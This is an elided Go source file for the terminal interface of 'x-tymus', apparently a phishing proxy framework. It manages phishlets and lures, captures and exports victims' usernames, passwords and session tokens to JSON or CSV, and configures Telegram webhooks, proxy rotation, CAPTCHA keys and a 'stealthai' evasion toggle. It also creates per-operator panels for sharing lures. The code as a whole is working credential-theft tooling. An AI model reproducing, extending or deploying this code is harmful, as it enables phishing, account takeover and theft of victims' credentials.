...
import (
	...
	"github.com/x-tymus/x-tymus/parser"
...
func (t *Terminal) DoWork() {
	...
	for !do_quit {
		...
		case "user":
			cmd_ok = true
			err := t.handleUser(args[1:])
			if err != nil {
				log.Error("user: %v", err)
			}
		case "blacklist":
			cmd_ok = true
...
func (t *Terminal) handleConfig(args []string) error {
	...
	if pn == 0 {
		...
		stealthAIStatus := "off"
		if t.cfg.IsStealthAIEnabled() {
			stealthAIStatus = "on"
		}
		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "webhook_telegram", "dnsentries", "turnstile_sitekey", "turnstile_privkey", "recaptcha_sitekey", "recaptcha_privkey", "stealthai"}
		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.WebhookTelegram, t.cfg.GetDnsEntries(), t.cfg.turnstile_sitekey, t.cfg.turnstile_privkey, t.cfg.recaptcha_sitekey, t.cfg.recaptcha_privkey, stealthAIStatus}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "stealthai":
			if args[1] == "on" {
				t.cfg.SetStealthAIEnabled(true)
				log.Info("StealthAI module enabled.")
				return nil
			} else if args[1] == "off" {
				t.cfg.SetStealthAIEnabled(false)
		...
		case "default_redirect":
			...
			t.cfg.SetDefaultRedirectUrl(args[1])
			return nil
		case "admin_password":
...
func (t *Terminal) handleProxy(args []string) error {
	...
	if pn == 0 {
		...
		keys := []string{"enabled", "current_index", "proxies"}
		var proxies_str string
		for i, p := range t.cfg.proxyConfig.Proxies {
			proxies_str += fmt.Sprintf("[%d] %s://%s:%d", i, p.Type, p.Address, p.Port)
			if p.Username != "" {
				proxies_str += " (auth)"
			}
			if i < len(t.cfg.proxyConfig.Proxies)-1 {
				proxies_str += ", "
			}
		}
		if proxies_str == "" {
		...
		vals := []string{proxy_enabled, strconv.Itoa(t.cfg.proxyConfig.CurrentIndex), proxies_str}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			err := t.p.setProxy(true, "", "", 0, "", "")
			if err != nil {
				return err
			}
			t.cfg.EnableProxy(true)
			log.Important("you need to restart x-tymus for the changes to take effect!")
			return nil
		case "disable":
			err := t.p.setProxy(false, "", "", 0, "", "")
			if err != nil {
				return err
			}
	...
	} else if pn >= 3 && args[0] == "add" {
		if len(args) < 4 {
			return fmt.Errorf("usage: proxy add <type> <address> <port> [username] [password]")
		}
		...
		t.cfg.AddProxy(args[1], args[2], port, username, password)
		return nil
	}
	return fmt.Errorf("invalid syntax: %s", args)
}
	...
	if pn == 0 {
		...
		case "export":
			...
			if format != "json" && format != "csv" {
				return fmt.Errorf("export: unsupported format '%s' — use json or csv", args[2])
			}
			...
			if len(sessions) == 0 {
				log.Info("no sessions to export")
				return nil
			}

			var export []*database.Session
			if args[1] == "all" {
				export = sessions
			} else {
				id, err := strconv.Atoi(args[1])
				if err != nil {
					return fmt.Errorf("export: invalid id '%s'", args[1])
				}
				for _, s := range sessions {
					if s.Id == id {
				...
				if len(export) == 0 {
					return fmt.Errorf("export: session id %d not found", id)
				}
			}

			ts := time.Now().Format("20060102_150405")
			fname := fmt.Sprintf("sessions_%s.%s", ts, format)
			...
			if format == "json" {
				...
				w := csv.NewWriter(f)
				w.Write([]string{"id", "phishlet", "username", "password", "remote_ip", "user_agent", "landing_url", "create_time", "update_time", "tokens"})
			...
			log.Success("exported %d session(s) to: %s", len(export), fname)
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
	...
	if pn > 0 {
		...
		case "create":
			if pn == 2 {
				...
				l := &Lure{
					...
					Phishlet:    args[1],
					RedirectUrl: t.cfg.GetDefaultRedirectUrl(),
				}
				t.cfg.AddLure(args[1], l)
				id := len(t.cfg.lures) - 1
				log.Info("created lure with ID: %d", id)
				if l.RedirectUrl != "" {
					log.Info("redirect set to: %s", l.RedirectUrl)
				}
				return nil
			}
		...
		case "assign":
			if pn == 3 {
				...
				userUsername := strings.TrimSpace(args[2])
				if userUsername == "none" || userUsername == "-" {
					l.UserId = ""
					t.cfg.SetLure(l_id, l)
					log.Info("lure %d unassigned from user", l_id)
				} else {
					if _, err := t.db.UserGetByUsername(userUsername); err != nil {
						return fmt.Errorf("assign: user '%s' not found", userUsername)
					}
					l.UserId = userUsername
					t.cfg.SetLure(l_id, l)
					log.Info("lure %d assigned to user: %s", l_id, userUsername)
				}
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
...
func (t *Terminal) handleUser(args []string) error {
	pn := len(args)
	...
	if pn == 0 {
		// list all users
		list, err := t.db.ListUsers()
		if err != nil {
			return err
		}
		if len(list) == 0 {
			log.Info("no users. use: user create <username> <password>")
			return nil
		}
		cols := []string{"id", "username", "panel url", "created"}
		var rows [][]string
		for _, s := range list {
			panelURL := fmt.Sprintf("http://<server>/panel/%s", s.Token)
			rows = append(rows, []string{
				strconv.Itoa(s.Id),
				cyan.Sprint(s.Username),
				green.Sprint(panelURL),
				gray.Sprint(time.Unix(s.CreatedAt, 0).Format("2006-01-02 15:04")),
			})
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		return nil
	...
	case "create":
		...
		s, err := t.db.CreateUser(username, password, token)
		if err != nil {
			return err
		}
		log.Success("user created: %s", white.Sprint(s.Username))
		log.Info("panel token : %s", cyan.Sprint(s.Token))
		log.Info("panel url   : %s", green.Sprint(fmt.Sprintf("http://<server>/panel/%s", s.Token)))
		return nil
	...
	case "delete":
		...
		s, err := t.db.UserGetByUsername(strings.TrimSpace(args[1]))
		if err != nil {
			return err
		}
		if err := t.db.DeleteUserById(s.Id); err != nil {
			return err
		}
		log.Info("user deleted: %s", red.Sprint(s.Username))
		return nil

	case "token":
		if pn != 2 {
			return fmt.Errorf("usage: user token <username>")
		}
		s, err := t.db.UserGetByUsername(strings.TrimSpace(args[1]))
		if err != nil {
			return err
		}
		log.Info("username  : %s", cyan.Sprint(s.Username))
		log.Info("token     : %s", white.Sprint(s.Token))
		log.Info("panel url : %s", green.Sprint(fmt.Sprintf("http://<server>/panel/%s", s.Token)))
		return nil

	case "password":
		if pn != 3 {
			return fmt.Errorf("usage: user password <username> <new_password>")
		}
		s, err := t.db.UserGetByUsername(strings.TrimSpace(args[1]))
		if err != nil {
			return err
		}
		if err := t.db.UpdateUserPassword(s.Id, strings.TrimSpace(args[2])); err != nil {
			return err
		}
		log.Info("password updated for: %s", cyan.Sprint(s.Username))
		return nil
	}
...
func (t *Terminal) createHelp() {
	...
	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password"), readline.PcItem("add"), readline.PcItem("rotate")))
	...
	h.AddSubCommand("proxy", []string{"add"}, "add <type> <address> <port> [username] [password]", "add a new proxy to the list")
	h.AddSubCommand("proxy", []string{"rotate"}, "rotate", "rotate to the next proxy in the list")
	...
	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
		readline.PcItem("sessions",
			...
			readline.PcItem("export", readline.PcItem("all", readline.PcItem("json"), readline.PcItem("csv"))),
		))
	...
	h.AddSubCommand("sessions", []string{"export"}, "export <id|all> <json|csv>", "export session(s) to a JSON or CSV file in the current directory")
	...
	h.AddSubCommand("lures", []string{"assign"}, "assign <id> <username|none>", "assign lure to a user (use 'none' to unassign)")

	h.AddCommand("user", "general", "manage users and their panels", "Create user accounts, assign lures, and generate panel URLs for each user.", LAYER_TOP,
	...
	h.AddSubCommand("user", nil, "", "list all users")
	h.AddSubCommand("user", []string{"create"}, "create <username> <password>", "create a new user with their own panel")
	h.AddSubCommand("user", []string{"delete"}, "delete <username>", "delete a user")
	h.AddSubCommand("user", []string{"token"}, "token <username>", "show user panel token and URL")
	h.AddSubCommand("user", []string{"password"}, "password <username> <new_password>", "change user password")
